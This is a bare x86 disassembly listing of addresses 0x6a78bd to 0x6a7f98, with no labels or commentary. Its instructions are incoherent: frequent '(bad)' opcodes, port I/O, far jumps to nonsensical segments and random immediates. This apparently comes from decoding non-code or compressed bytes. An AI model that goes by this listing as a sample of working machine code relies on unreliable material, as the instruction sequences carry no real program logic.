  6a78bd:	outs   dx,DWORD PTR ds:[esi]
  6a78be:	(bad)  
  6a78bf:	in     eax,dx
  6a78c0:	rcr    DWORD PTR [eax+0x2b853546],1
  6a78c6:	out    0x7,al
  6a78c8:	sbb    cl,cl
  6a78ca:	fisub  WORD PTR [esp+esi*2+0x9]
  6a78ce:	add    eax,0x31c662ab
  6a78d3:	rcl    dh,0xb3
  6a78d6:	bound  ebp,QWORD PTR [ecx-0x5d5d787c]
  6a78dc:	pop    esi
  6a78dd:	scas   eax,DWORD PTR es:[edi]
  6a78de:	sbb    dh,bl
  6a78e0:	mov    edi,0x1742f08
  6a78e5:	dec    esp
  6a78e6:	repz sbb dl,dl
  6a78e9:	das    
  6a78ea:	fmul   DWORD PTR [ecx-0x63e8154]
  6a78f0:	scas   al,BYTE PTR es:[edi]
  6a78f1:	(bad)
  6a78f4:	sbb    ebp,esp
  6a78f6:	js     0x6a7890
  6a78f8:	or     DWORD PTR [ecx],edi
  6a78fa:	push   ecx
  6a78fb:	imul   ecx,DWORD PTR [ebx-0x49fffad1],0x1d
  6a7902:	and    eax,0x76284db9
  6a7907:	push   edx
  6a7908:	cmp    DWORD PTR [edi-0x9b3b57b],ebp
  6a790e:	das    
  6a790f:	jb     0x6a791a
  6a7911:	push   esp
  6a7912:	popf   
  6a7913:	call   0xa1425737
  6a7918:	add    DWORD PTR [ecx],ebx
  6a791a:	(bad)
  6a791e:	and    eax,0x8dc968dc
  6a7923:	(bad)  
  6a7924:	mov    al,0xb3
  6a7926:	dec    ecx
  6a7927:	mov    BYTE PTR [esp+eiz*2-0x53],cl
  6a792b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a792c:	inc    esi
  6a792d:	mov    ?,WORD PTR [ecx+ecx*4]
  6a7930:	lock test BYTE PTR [edi],0x50
  6a7934:	mov    BYTE PTR [esi-0x42],bl
  6a7937:	(bad)  
  6a7938:	or     dh,BYTE PTR [esp+ebp*1+0x50]
  6a793c:	gs cwde 
  6a793e:	cmp    edi,esp
  6a7940:	aas    
  6a7941:	popa   
  6a7942:	dec    esp
  6a7943:	fs push cs
  6a7945:	out    dx,al
  6a7946:	lea    ebp,ss:[esi]
  6a7949:	shr    BYTE PTR [edx],cl
  6a794b:	sbb    al,0x5a
  6a794d:	in     al,dx
  6a794e:	cwde   
  6a794f:	imul   ebx,DWORD PTR [esi-0x22],0x21
  6a7953:	add    eax,0x483d2e79
  6a7958:	jle    0x6a78f2
  6a795a:	shl    bh,1
  6a795c:	dec    esp
  6a795d:	lea    ecx,ds:0x1c423cef
  6a7963:	out    0x5a,eax
  6a7965:	xchg   ebx,eax
  6a7966:	mov    edx,0x5a653f8a
  6a796b:	leave  
  6a796c:	(bad)  
  6a796d:	loopne 0x6a79ae
  6a796f:	cs adc al,0x11
  6a7972:	pop    esp
  6a7973:	jb     0x6a7967
  6a7975:	or     ah,0x70
  6a7978:	push   ds
  6a7979:	adc    DWORD PTR ds:0xfd330ac6,esi
  6a797f:	cdq    
  6a7980:	(bad)  
  6a7981:	sti    
  6a7982:	outs   dx,DWORD PTR ds:[esi]
  6a7983:	cmp    BYTE PTR ds:0x7b5ca4a4,bh
  6a7989:	adc    ah,BYTE PTR fs:[ebp+0x48]
  6a798d:	test   BYTE PTR [ebp+0x24],0xda
  6a7991:	push   ds
  6a7992:	pop    esp
  6a7993:	out    dx,eax
  6a7994:	add    eax,0xb5773893
  6a7999:	add    eax,0x2e9603c4
  6a799e:	adc    esp,DWORD PTR [esi]
  6a79a0:	and    edx,DWORD PTR [edi+eiz*8-0x2fec5b8d]
  6a79a7:	iret   
  6a79a8:	pop    esp
  6a79a9:	call   0x95143abd
  6a79ae:	lahf   
  6a79af:	jb     0x6a7a1e
  6a79b1:	push   0x26443d9c
  6a79b6:	ins    BYTE PTR es:[edi],dx
  6a79b7:	jp     0x6a79fb
  6a79b9:	out    dx,eax
  6a79ba:	mov    bl,0x3f
  6a79bc:	inc    edi
  6a79bd:	inc    ebp
  6a79be:	lods   eax,DWORD PTR ds:[esi]
  6a79bf:	xor    al,0xe1
  6a79c1:	xchg   ecx,eax
  6a79c2:	iret   
  6a79c3:	imul   esp,DWORD PTR [ebx+0x47],0xc2e16f86
  6a79ca:	ins    DWORD PTR es:[edi],dx
  6a79cb:	mov    bl,0xdd
  6a79cd:	fisttp QWORD PTR [edi]
  6a79cf:	adc    DWORD PTR [esi+ebp*8],edi
  6a79d2:	dec    edi
  6a79d3:	ficomp WORD PTR [ebx*8+0x71e7f47b]
  6a79da:	out    0x6e,al
  6a79dc:	and    eax,DWORD PTR [ecx+0x79]
  6a79df:	push   edx
  6a79e0:	imul   ebx,DWORD PTR [esi+0x18c6b173],0x7f
  6a79e7:	loop   0x6a7995
  6a79e9:	push   ds
  6a79ea:	sar    BYTE PTR [ebp+0x41],0x45
  6a79ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a79ef:	jns    0x6a7974
  6a79f1:	push   0xf06b71f0
  6a79f6:	loopne 0x6a79f2
  6a79f8:	inc    ecx
  6a79f9:	repnz retf 
  6a79fb:	xor    al,0x7c
  6a79fd:	in     al,0xaa
  6a79ff:	retf   
  6a7a00:	out    dx,al
  6a7a01:	push   ecx
  6a7a02:	add    al,0xf7
  6a7a04:	xchg   ebx,eax
  6a7a05:	mov    BYTE PTR [esp+ebx*2+0x3],cl
  6a7a09:	mov    dh,0xc5
  6a7a0b:	mov    ebp,0x61fe1c7
  6a7a10:	jo     0x6a79ed
  6a7a12:	clc    
  6a7a13:	retf   
  6a7a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a7a15:	gs clc 
  6a7a17:	push   ebp
  6a7a18:	and    al,0xd8
  6a7a1a:	sti    
  6a7a1b:	aad    0xe7
  6a7a1d:	loop   0x6a7a93
  6a7a1f:	xor    esp,DWORD PTR [ecx]
  6a7a21:	in     eax,dx
  6a7a22:	push   ss
  6a7a23:	test   eax,0x37cac470
  6a7a28:	inc    esi
  6a7a29:	mov    ds:0x1670a786,eax
  6a7a2e:	mov    esi,0xbd85cc9b
  6a7a33:	mov    ch,BYTE PTR [edx+edi*4-0x16]
  6a7a37:	lods   eax,DWORD PTR ds:[esi]
  6a7a38:	jmp    DWORD PTR [edi]
  6a7a3a:	aaa    
  6a7a3b:	jmp    0x80ca:0xe4d1d0ad
  6a7a42:	push   0xffffff8f
  6a7a44:	mov    ah,0xe0
  6a7a46:	xlat   BYTE PTR ds:[ebx]
  6a7a47:	stos   BYTE PTR es:[edi],al
  6a7a48:	push   0xc7ff45d5
  6a7a4d:	jnp    0x6a7a3b
  6a7a4f:	dec    eax
  6a7a50:	bound  eax,QWORD PTR [esi-0x31b41849]
  6a7a56:	or     eax,0x3713870b
  6a7a5b:	xor    ebx,edx
  6a7a5d:	inc    esi
  6a7a5e:	nop
  6a7a5f:	rcl    BYTE PTR [ebx-0x61],cl
  6a7a62:	out    0x4,eax
  6a7a64:	fnstsw WORD PTR [ebx+0x3b3a4c62]
  6a7a6a:	scas   al,BYTE PTR es:[edi]
  6a7a6b:	das    
  6a7a6c:	pop    ebx
  6a7a6d:	mov    ds:0x49b57d11,al
  6a7a72:	cld    
  6a7a73:	push   edx
  6a7a74:	add    BYTE PTR [edx+0x537ffc77],0x75
  6a7a7b:	sub    al,0x2b
  6a7a7d:	mov    esp,0x683bbca5
  6a7a82:	pop    esp
  6a7a83:	es ins DWORD PTR es:[edi],dx
  6a7a85:	in     eax,dx
  6a7a86:	mov    dl,0x89
  6a7a88:	pop    edi
  6a7a89:	mov    cl,0x1
  6a7a8b:	out    dx,al
  6a7a8c:	jmp    0x26841381
  6a7a91:	loopne 0x6a7af0
  6a7a93:	sub    al,0x7e
  6a7a95:	rcr    ebx,0xe8
  6a7a98:	cwde   
  6a7a99:	mov    BYTE PTR [edx-0x26f54a8a],0x8
  6a7aa0:	(bad)  
  6a7aa2:	nop
  6a7aa3:	out    dx,eax
  6a7aa4:	sahf   
  6a7aa5:	push   esi
  6a7aa6:	mov    ch,0xaf
  6a7aa8:	xor    esp,edx
  6a7aaa:	push   edx
  6a7aab:	mov    DWORD PTR [ecx-0x449eca75],ecx
  6a7ab1:	xchg   ebx,eax
  6a7ab2:	adc    al,0x7d
  6a7ab4:	cs jno 0x6a7aac
  6a7ab7:	adc    edi,DWORD PTR [ebp-0x7759c629]
  6a7abd:	xchg   ecx,eax
  6a7abe:	mov    sp,WORD PTR [ebp+ebp*4-0x3cace1a2]
  6a7ac6:	addr16 ja 0x6a7ac7
  6a7ac9:	pop    ebx
  6a7aca:	pop    edx
  6a7acb:	sbb    bh,ch
  6a7acd:	push   0x1c
  6a7acf:	icebp  
  6a7ad0:	pop    esi
  6a7ad1:	dec    edi
  6a7ad2:	inc    esi
  6a7ad3:	dec    edi
  6a7ad4:	cmp    eax,0x289f40aa
  6a7ad9:	popf   
  6a7ada:	sahf   
  6a7adb:	retf   0x1ffa
  6a7ade:	sbb    esp,DWORD PTR [ecx]
  6a7ae0:	cld    
  6a7ae1:	shr    BYTE PTR [ebx-0x47cbc07c],1
  6a7ae7:	test   DWORD PTR [edx-0x27],ebx
  6a7aea:	jnp    0x6a7afc
  6a7aec:	int    0x2d
  6a7aee:	and    al,0xab
  6a7af0:	xchg   bl,al
  6a7af2:	jle    0x6a7b24
  6a7af4:	dec    ebp
  6a7af5:	es jg  0x6a7ad6
  6a7af8:	sbb    BYTE PTR [ebx],bh
  6a7afa:	scas   eax,DWORD PTR es:[edi]
  6a7afb:	and    al,0xf3
  6a7afd:	lahf   
  6a7afe:	cmp    BYTE PTR [ebx+0xb],cl
  6a7b01:	das    
  6a7b02:	call   0xb608:0xd3dc49f
  6a7b09:	in     eax,dx
  6a7b0a:	ins    DWORD PTR es:[edi],dx
  6a7b0b:	xor    esp,esi
  6a7b0d:	mov    ecx,0xb987d121
  6a7b12:	or     eax,0x11824d70
  6a7b17:	mov    ds:0x5d5d658c,eax
  6a7b1c:	cmp    al,0x47
  6a7b1e:	mov    esi,0x8c5ea1f7
  6a7b23:	sbb    al,0x70
  6a7b25:	daa    
  6a7b26:	daa    
  6a7b27:	push   esp
  6a7b28:	adc    BYTE PTR [ebp+0x2846ccf7],dh
  6a7b2e:	popf   
  6a7b2f:	shl    DWORD PTR ds:0xb29aa5d4,cl
  6a7b35:	not    DWORD PTR [ecx]
  6a7b37:	fdiv   QWORD PTR [esi-0xc2660ab]
  6a7b3d:	pushf  
  6a7b3e:	in     eax,0xbb
  6a7b40:	popf   
  6a7b41:	xchg   BYTE PTR [eax+0x35],ch
  6a7b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a7b45:	addr16 das 
  6a7b47:	jb     0x6a7b6f
  6a7b49:	add    al,0x6b
  6a7b4b:	add    BYTE PTR [esi+0x4e],bh
  6a7b4e:	pop    esi
  6a7b4f:	retf   
  6a7b50:	ins    DWORD PTR es:[edi],dx
  6a7b51:	add    ch,BYTE PTR [esi-0x4be30111]
  6a7b57:	pop    ebp
  6a7b58:	jl     0x6a7b9f
  6a7b5a:	and    bl,BYTE PTR [ecx-0x38b287d5]
  6a7b60:	mov    eax,ds:0x7b03795a
  6a7b65:	mov    ecx,0x6bbf87e4
  6a7b6a:	pop    ds
  6a7b6b:	adc    DWORD PTR [ecx-0x2e3e8aa7],ebp
  6a7b71:	(bad)  
  6a7b72:	pop    eax
  6a7b73:	xor    eax,0xf4c73a12
  6a7b78:	and    al,0xf9
  6a7b7a:	lds    edi,FWORD PTR ds:0xae45f826
  6a7b80:	dec    edx
  6a7b81:	sti    
  6a7b82:	lods   eax,DWORD PTR ds:[esi]
  6a7b83:	push   edx
  6a7b84:	or     DWORD PTR ss:[edx-0x70],ebp
  6a7b88:	pop    eax
  6a7b89:	dec    ebp
  6a7b8a:	pop    ebp
  6a7b8b:	cmc    
  6a7b8c:	push   ebp
  6a7b8d:	sahf   
  6a7b8e:	mov    bl,0xb6
  6a7b90:	pop    edx
  6a7b91:	retf   0xb256
  6a7b94:	ja     0x6a7bb2
  6a7b96:	sub    ax,0x3534
  6a7b9a:	mov    DWORD PTR [ebx-0x22],esi
  6a7b9d:	jae    0x6a7be9
  6a7b9f:	mov    edx,0x78d16cad
  6a7ba4:	pop    esp
  6a7ba5:	rep lods eax,DWORD PTR ds:[esi]
  6a7ba7:	pop    esi
  6a7ba8:	mov    edx,0x434ca333
  6a7bad:	test   BYTE PTR [eax],bh
  6a7baf:	loopne 0x6a7ba7
  6a7bb1:	test   DWORD PTR [esi],ebx
  6a7bb3:	cmp    al,0xb9
  6a7bb5:	ficom  DWORD PTR es:0x3a0c7a91
  6a7bbc:	daa    
  6a7bbd:	test   DWORD PTR [ebx-0x75],edi
  6a7bc0:	xor    BYTE PTR [esi+0x29],al
  6a7bc3:	sbb    eax,0x45e01df4
  6a7bc9:	stos   DWORD PTR es:[edi],eax
  6a7bca:	rol    BYTE PTR [ebx],0x23
  6a7bcd:	repz xor BYTE PTR [edi+0x53],cl
  6a7bd1:	mov    bl,0xb3
  6a7bd3:	mov    ebp,0x14a31c2e
  6a7bd8:	jecxz  0x6a7c3b
  6a7bda:	sub    BYTE PTR [ebx],bh
  6a7bdc:	pop    ebp
  6a7bdd:	xchg   ch,bh
  6a7bdf:	imul   edi,DWORD PTR [eax-0x13],0xffffffec
  6a7be3:	adc    esi,edx
  6a7be5:	out    dx,eax
  6a7be6:	adc    bl,cl
  6a7be8:	mov    dl,0x32
  6a7bea:	pop    es
  6a7beb:	fist   DWORD PTR [ebp+0x5b]
  6a7bee:	ficom  DWORD PTR [eax+0x77]
  6a7bf1:	mov    ds,WORD PTR [edx]
  6a7bf3:	push   es
  6a7bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a7bf5:	fld    st(6)
  6a7bf7:	push   edx
  6a7bf8:	retf   0xc358
  6a7bfb:	push   ds
  6a7bfc:	outs   dx,BYTE PTR ds:[esi]
  6a7bfd:	addr16 jno 0x6a7c07
  6a7c00:	into   
  6a7c01:	(bad)  
  6a7c02:	out    dx,eax
  6a7c03:	inc    esi
  6a7c04:	jp     0x6a7c63
  6a7c06:	sub    al,0x8a
  6a7c08:	sbb    al,0xb
  6a7c0a:	(bad)  
  6a7c0b:	je     0x6a7c46
  6a7c0d:	sahf   
  6a7c0e:	sbb    ecx,DWORD PTR [ecx+0x52]
  6a7c11:	push   cs
  6a7c12:	mov    eax,0x56829597
  6a7c17:	stos   DWORD PTR es:[edi],eax
  6a7c18:	push   eax
  6a7c19:	arpl   dx,ax
  6a7c1b:	lods   eax,DWORD PTR ds:[esi]
  6a7c1c:	mov    ds:0x2963b4fe,eax
  6a7c21:	push   es
  6a7c22:	stos   DWORD PTR es:[edi],eax
  6a7c23:	shr    ecx,1
  6a7c25:	popa   
  6a7c26:	mov    bl,0x24
  6a7c28:	dec    edi
  6a7c29:	push   ebp
  6a7c2a:	int    0xb4
  6a7c2c:	add    eax,0xa8502c85
  6a7c31:	aam    0xb5
  6a7c33:	push   es
  6a7c34:	jle    0x6a7c95
  6a7c36:	sub    al,dl
  6a7c38:	out    dx,eax
  6a7c39:	repz out dx,al
  6a7c3b:	cmp    al,0xbd
  6a7c3d:	mov    edx,0x1c29f3e7
  6a7c42:	out    dx,al
  6a7c43:	fbstp  TBYTE PTR [esi]
  6a7c45:	repz das 
  6a7c47:	je     0x6a7c47
  6a7c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a7c4a:	ds retf 0xaf92
  6a7c4e:	sti    
  6a7c4f:	mov    ecx,0x4e0b6371
  6a7c54:	cwde   
  6a7c55:	jmp    0x6a7bf3
  6a7c57:	mov    dh,0x41
  6a7c59:	fnstsw WORD PTR [esp+esi*4+0x90f1c6c]
  6a7c60:	dec    ecx
  6a7c61:	mov    ah,BYTE PTR [ebx+0x340505e2]
  6a7c67:	xchg   BYTE PTR [ecx+0x70c9420],bl
  6a7c6d:	clc    
  6a7c6e:	xchg   edi,eax
  6a7c6f:	fmul   QWORD PTR [edx+ebp*4+0x12]
  6a7c73:	pop    ebx
  6a7c74:	rcl    DWORD PTR [eax-0x4d],cl
  6a7c77:	out    dx,al
  6a7c78:	hlt    
  6a7c79:	and    edi,ebx
  6a7c7b:	ror    BYTE PTR [edi-0x41],0xd6
  6a7c7f:	and    al,0x5
  6a7c81:	cli    
  6a7c82:	mov    bl,0xd1
  6a7c84:	xchg   esi,eax
  6a7c85:	scas   eax,DWORD PTR es:[edi]
  6a7c86:	push   ebp
  6a7c87:	cmp    al,0x27
  6a7c89:	(bad)
  6a7c8c:	(bad)  
  6a7c8d:	fsubr  QWORD PTR [ebx+0x64]
  6a7c90:	and    al,BYTE PTR [edi-0x2914599c]
  6a7c96:	dec    esi
  6a7c97:	jae    0x6a7c41
  6a7c99:	mov    edx,0x699bc39f
  6a7c9e:	push   edi
  6a7c9f:	ficomp DWORD PTR [edi+eiz*8]
  6a7ca2:	outs   dx,BYTE PTR ds:[esi]
  6a7ca3:	jle    0x6a7cb4
  6a7ca5:	xchg   DWORD PTR [edx],eax
  6a7ca7:	ja     0x6a7c9b
  6a7ca9:	or     al,dl
  6a7cab:	mov    ah,0xc
  6a7cad:	or     edi,DWORD PTR ds:0x56d43aed
  6a7cb3:	(bad)  
  6a7cb4:	cmp    al,0x9a
  6a7cb6:	inc    esi
  6a7cb7:	cld    
  6a7cb8:	jb     0x6a7c73
  6a7cba:	sub    esi,edx
  6a7cbc:	js     0x6a7c70
  6a7cbe:	adc    bl,al
  6a7cc0:	sub    al,0x45
  6a7cc2:	fistp  DWORD PTR [edi]
  6a7cc4:	stos   DWORD PTR es:[edi],eax
  6a7cc5:	pop    edx
  6a7cc6:	gs and ch,dh
  6a7cc9:	out    0x3e,eax
  6a7ccb:	or     BYTE PTR [ebx],0x4b
  6a7cce:	adc    bh,cl
  6a7cd0:	mov    eax,ds:0xe6c4cf0b
  6a7cd5:	push   esi
  6a7cd6:	sub    al,0xd7
  6a7cd8:	clc    
  6a7cd9:	adc    BYTE PTR [edx-0x6d110f34],al
  6a7cdf:	test   DWORD PTR [esi-0x5804bc11],0x6ec440c8
  6a7ce9:	cmp    edi,ebx
  6a7ceb:	aas    
  6a7cec:	icebp  
  6a7ced:	call   0xbe1:0x54d2db85
  6a7cf4:	mov    cl,BYTE PTR [edx]
  6a7cf6:	into   
  6a7cf7:	xchg   edi,eax
  6a7cf8:	test   al,0x8b
  6a7cfa:	daa    
  6a7cfb:	cmp    al,0xf1
  6a7cfd:	scas   eax,DWORD PTR es:[edi]
  6a7cfe:	pop    ds
  6a7cff:	push   0x4a
  6a7d01:	addr16 push ss
  6a7d03:	jecxz  0x6a7ccb
  6a7d05:	(bad)  
  6a7d06:	push   eax
  6a7d07:	repz adc ch,0x79
  6a7d0b:	jp     0x6a7d2c
  6a7d0d:	sbb    DWORD PTR ds:0xc02a1f06,eax
  6a7d13:	popf   
  6a7d14:	popa   
  6a7d15:	dec    esi
  6a7d16:	adc    edi,ecx
  6a7d18:	mov    ch,0x9e
  6a7d1a:	mov    esi,0xb010b522
  6a7d1f:	sub    al,0xc9
  6a7d21:	jbe    0x6a7d3e
  6a7d23:	cli    
  6a7d24:	and    al,0xc5
  6a7d26:	xchg   esi,eax
  6a7d27:	arpl   WORD PTR [edx],sp
  6a7d29:	or     eax,DWORD PTR [ebp+0x33b0e301]
  6a7d2f:	add    eax,0xfc9bbd8b
  6a7d34:	(bad)  
  6a7d35:	fld    QWORD PTR [eax]
  6a7d37:	sti    
  6a7d38:	add    al,0x2f
  6a7d3a:	mov    bh,0x5c
  6a7d3c:	sbb    bl,bh
  6a7d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a7d3f:	ret    0x81e6
  6a7d42:	mov    al,0x97
  6a7d44:	pop    ecx
  6a7d45:	scas   al,BYTE PTR es:[edi]
  6a7d46:	outs   dx,BYTE PTR ds:[esi]
  6a7d47:	cld    
  6a7d48:	add    dl,BYTE PTR [edi]
  6a7d4a:	mov    ebx,0xa6a1300
  6a7d4f:	mov    eax,0xd1626fbd
  6a7d54:	in     eax,0x4c
  6a7d56:	dec    esi
  6a7d57:	in     al,0xda
  6a7d59:	es in  eax,dx
  6a7d5b:	mov    al,ds:0xf9973aa
  6a7d60:	mov    edx,0x19c3d48c
  6a7d65:	in     al,dx
  6a7d66:	or     BYTE PTR [ebx],bl
  6a7d68:	aad    0x8a
  6a7d6a:	pusha  
  6a7d6b:	xchg   DWORD PTR [ecx+0x4d],eax
  6a7d6e:	dec    ebx
  6a7d6f:	ds dec ebx
  6a7d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a7d72:	jmp    0x2e258282
  6a7d77:	out    0x88,eax
  6a7d79:	xor    eax,0xb868858b
  6a7d7e:	mov    al,0xdc
  6a7d80:	rcr    BYTE PTR [edi-0x3023bc98],1
  6a7d86:	and    al,0x16
  6a7d88:	adc    eax,0x5588b837
  6a7d8d:	(bad)  
  6a7d8f:	fnsave [edx+0x4e6f48fb]
  6a7d95:	sahf   
  6a7d96:	hlt    
  6a7d97:	cdq    
  6a7d98:	xchg   edx,eax
  6a7d99:	push   ss
  6a7d9a:	ret    
  6a7d9b:	pop    ecx
  6a7d9c:	pop    ebx
  6a7d9d:	arpl   WORD PTR [ebx-0x6d],sp
  6a7da0:	mov    ecx,DWORD PTR [edx]
  6a7da2:	push   edx
  6a7da3:	push   ebp
  6a7da4:	rol    dl,cl
  6a7da6:	mov    ds:0x64fd47f1,al
  6a7dab:	out    0xcc,eax
  6a7dad:	inc    ebx
  6a7dae:	jbe    0x6a7e2a
  6a7db0:	inc    edx
  6a7db1:	adc    DWORD PTR [ebx-0x7c],edx
  6a7db4:	cmp    al,BYTE PTR [esi+edx*1]
  6a7db7:	retf   0x781f
  6a7dba:	jmp    0xccd8:0xb1513b8d
  6a7dc1:	push   ecx
  6a7dc2:	xchg   ebp,eax
  6a7dc3:	(bad)  [ebp-0x1f]
  6a7dc6:	cmp    esp,DWORD PTR [ecx+0x3c]
  6a7dc9:	pop    ebx
  6a7dca:	mov    dh,0x90
  6a7dcc:	daa    
  6a7dcd:	mov    esp,0xb67aa4dd
  6a7dd2:	cmp    BYTE PTR [ecx],dl
  6a7dd4:	jmp    0xeb331bf8
  6a7dd9:	fdivr  DWORD PTR [edi+eiz*4]
  6a7ddc:	sbb    ecx,eax
  6a7dde:	and    edx,DWORD PTR [esi-0x4432ef7c]
  6a7de4:	nop
  6a7de5:	mov    dl,0x3e
  6a7de7:	call   0x5ad9cd9
  6a7dec:	jmp    0x233e2cd7
  6a7df1:	loope  0x6a7df5
  6a7df3:	mov    dl,0x98
  6a7df5:	lods   al,BYTE PTR ds:[esi]
  6a7df6:	jl     0x6a7d95
  6a7df8:	xchg   esp,eax
  6a7df9:	mov    fs,WORD PTR [ebx+0xe]
  6a7dfc:	dec    edx
  6a7dfd:	enter  0xf8e2,0xbb
  6a7e01:	ror    DWORD PTR [esi],0xa4
  6a7e04:	jl     0x6a7e65
  6a7e06:	jl     0x6a7e5e
  6a7e08:	and    BYTE PTR [ebx-0x4358678c],al
  6a7e0e:	stc    
  6a7e0f:	or     eax,0x2e13fea8
  6a7e14:	and    BYTE PTR [ecx+0x61907857],0x5
  6a7e1b:	mov    bl,0x91
  6a7e1d:	dec    esp
  6a7e1e:	jnp    0x6a7e7a
  6a7e20:	cld    
  6a7e21:	into   
  6a7e22:	lds    ecx,FWORD PTR ds:0xfcfe0a4f
  6a7e28:	sbb    eax,0x98a400f0
  6a7e2d:	shl    BYTE PTR [edi-0x4f],1
  6a7e30:	and    BYTE PTR [edx+0x24],ah
  6a7e33:	xor    al,0x61
  6a7e35:	psadbw mm5,mm4
  6a7e38:	cmp    DWORD PTR [edi+0x1035cb5d],esi
  6a7e3e:	mov    DWORD PTR ds:0x7f0685ae,eax
  6a7e44:	mov    dh,0xda
  6a7e46:	and    DWORD PTR [eax-0x18c0e7ba],esi
  6a7e4c:	loopne 0x6a7e0d
  6a7e4e:	out    dx,al
  6a7e4f:	int    0xa0
  6a7e51:	int3   
  6a7e52:	inc    ecx
  6a7e53:	leave  
  6a7e54:	ja     0x6a7e64
  6a7e56:	jmp    0x6a7e20
  6a7e58:	jb     0x6a7e66
  6a7e5a:	stos   BYTE PTR es:[edi],al
  6a7e5b:	mov    dh,0xe
  6a7e5d:	and    edi,0xa4632562
  6a7e63:	cmc    
  6a7e64:	ds sahf 
  6a7e66:	mov    eax,0x22e383be
  6a7e6b:	outs   dx,DWORD PTR ds:[esi]
  6a7e6c:	stos   DWORD PTR es:[edi],eax
  6a7e6d:	iret   
  6a7e6e:	or     ch,BYTE PTR [esi+0x36]
  6a7e71:	repnz pop ds
  6a7e73:	sbb    DWORD PTR [ecx+ecx*2],ebp
  6a7e76:	shl    BYTE PTR [esi-0x6d],0xbd
  6a7e7a:	jge    0x6a7e64
  6a7e7c:	mov    al,0x2e
  6a7e7e:	test   ch,cl
  6a7e80:	into   
  6a7e81:	push   ss
  6a7e82:	jbe    0x6a7e85
  6a7e84:	xchg   edx,eax
  6a7e85:	ficomp DWORD PTR [edx+0x1f]
  6a7e88:	clc    
  6a7e89:	cmp    eax,0xe7ae49a6
  6a7e8e:	push   0x5
  6a7e90:	je     0x6a7ee9
  6a7e92:	inc    edi
  6a7e93:	xchg   edi,eax
  6a7e94:	sbb    ecx,DWORD PTR [edx+0x29]
  6a7e97:	call   0x72a2:0x9646722c
  6a7e9e:	ret    
  6a7e9f:	xchg   esp,eax
  6a7ea0:	(bad)  
  6a7ea2:	mov    ebx,0x996faef5
  6a7ea7:	add    BYTE PTR [eax+eiz*4],bl
  6a7eaa:	mov    ds:0x694bd90a,eax
  6a7eaf:	(bad)  [ebp+0x67]
  6a7eb2:	ret    0xf268
  6a7eb5:	call   DWORD PTR [edx]
  6a7eb7:	aas    
  6a7eb8:	or     DWORD PTR [ecx+0x217f7ec4],eax
  6a7ebe:	std    
  6a7ebf:	cmp    ebx,DWORD PTR [edx-0x62]
  6a7ec2:	mov    bl,0x4d
  6a7ec4:	cmp    edx,eax
  6a7ec6:	inc    ecx
  6a7ec7:	push   edx
  6a7ec8:	push   ebp
  6a7ec9:	hlt    
  6a7eca:	xchg   esi,eax
  6a7ecb:	mov    ebx,DWORD PTR [edi-0x4271a911]
  6a7ed1:	jbe    0x6a7e61
  6a7ed3:	pop    eax
  6a7ed4:	leave  
  6a7ed5:	sahf   
  6a7ed6:	xchg   ebp,eax
  6a7ed7:	sub    DWORD PTR [ecx-0x50ff6bb],eax
  6a7edd:	xor    esi,DWORD PTR [ebx+0x79]
  6a7ee0:	push   ecx
  6a7ee1:	cmp    DWORD PTR [ecx+ebx*4+0x4a],esi
  6a7ee5:	push   esi
  6a7ee6:	jbe    0x6a7edc
  6a7ee8:	mov    ebp,0xa6f5a505
  6a7eed:	int    0xb5
  6a7eef:	or     eax,0x691f2c44
  6a7ef4:	jmp    0x906b:0x251d2619
  6a7efb:	ret    0xca08
  6a7efe:	nop    edx
  6a7f01:	mov    al,ds:0x2495550c
  6a7f06:	sub    edi,DWORD PTR [edi-0x7a]
  6a7f09:	cwde   
  6a7f0a:	fild   QWORD PTR [ecx+edi*4+0x1a56d485]
  6a7f11:	data16 or al,0x72
  6a7f14:	dec    ecx
  6a7f15:	idiv   DWORD PTR [eax-0x512b6c4c]
  6a7f1b:	pop    es
  6a7f1c:	jmp    DWORD PTR [esi]
  6a7f1e:	jne    0x6a7eee
  6a7f20:	ficom  WORD PTR ds:0xf2d1fad3
  6a7f26:	aaa    
  6a7f27:	mov    dl,0xd
  6a7f29:	push   0x5f669029
  6a7f2e:	or     eax,DWORD PTR [edi-0x68]
  6a7f31:	sbb    eax,0x92742c55
  6a7f36:	sub    BYTE PTR [eax],cl
  6a7f38:	xlat   BYTE PTR ds:[ebx]
  6a7f39:	out    dx,eax
  6a7f3a:	lods   eax,DWORD PTR ds:[esi]
  6a7f3b:	dec    ecx
  6a7f3c:	popf   
  6a7f3d:	mov    edx,0x72d4ca78
  6a7f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a7f43:	push   cs
  6a7f44:	repnz or bl,BYTE PTR [ebx]
  6a7f47:	into   
  6a7f48:	and    eax,0xa3981b0e
  6a7f4d:	cmp    al,0x56
  6a7f4f:	mov    ebx,DWORD PTR [ebx+0x4e]
  6a7f52:	fstp   TBYTE PTR [edi-0x2f859c13]
  6a7f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a7f59:	jle    0x6a7f55
  6a7f5b:	es stos DWORD PTR es:[edi],eax
  6a7f5d:	add    ah,0x47
  6a7f60:	sbb    al,0xe9
  6a7f62:	push   0x54ed9af9
  6a7f67:	clc    
  6a7f68:	cmp    eax,edx
  6a7f6a:	xor    DWORD PTR [esi],ebx
  6a7f6c:	ins    DWORD PTR es:[edi],dx
  6a7f6d:	loop   0x6a7f42
  6a7f6f:	xchg   ebx,eax
  6a7f70:	call   0x6f77:0x2a4950ae
  6a7f77:	ins    BYTE PTR es:[edi],dx
  6a7f78:	rol    esi,0xb8
  6a7f7b:	ja     0x6a7f07
  6a7f7d:	inc    eax
  6a7f7e:	ret    0x9389
  6a7f81:	sti    
  6a7f82:	in     al,dx
  6a7f83:	xor    al,0xab
  6a7f85:	sti    
  6a7f86:	rcr    DWORD PTR [esi],0xa7
  6a7f89:	mov    edi,0xe58313f2
  6a7f8e:	popa   
  6a7f8f:	pop    ecx
  6a7f90:	mov    edi,0x7643ce76
  6a7f95:	push   ebp
  6a7f96:	js     0x6a7f82
  6a7f98:	lds    esp,FWORD PTR [edx-0x594562bf]
